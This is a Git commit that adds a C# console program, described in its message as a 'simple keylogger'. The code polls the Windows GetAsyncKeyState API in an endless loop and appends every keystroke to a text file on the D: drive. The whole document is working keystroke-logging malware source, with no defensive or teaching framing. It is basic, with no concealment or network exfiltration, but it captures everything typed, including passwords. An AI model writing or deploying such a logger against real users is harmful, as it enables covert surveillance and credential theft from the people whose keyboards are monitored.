2dae848b88d5adb311fb816fc82f8ccda65e0ac0
Fred <Fredbaltimore@users.noreply.github.com>
2017-03-30 19:26:07 -0400

    Add files via upload
    C#, simple keylogger

---
+++ Program.cs
@@ -0,0 +1,51 @@
+﻿
+
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace KeyLogger
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        static void Main(string[] args)
+        {
+            LogKeys();
+        }
+
+        static void LogKeys()
+        {
+            var path = (@"D:\Keylog.text");
+            if (!File.Exists(path))
+            {
+                using (var sw = File.CreateText(path))
+                {
+                }
+            }
+           
+            var converter = new KeysConverter();
+
+            while (true)
+            {
+                Thread.Sleep(10);
+
+                for (Int32 i = 0; i < 255; i++)
+                {
+                    int key = GetAsyncKeyState(i);
+
+                    if (key != 1 && key != -32767) continue;
+                    var text = converter.ConvertToString(i);
+                    using (var sw = File.AppendText(path))
+                    {
+                        sw.WriteLine(text);
+                    }
+                    break;
+                }
+            }
+        }
+    }
+}
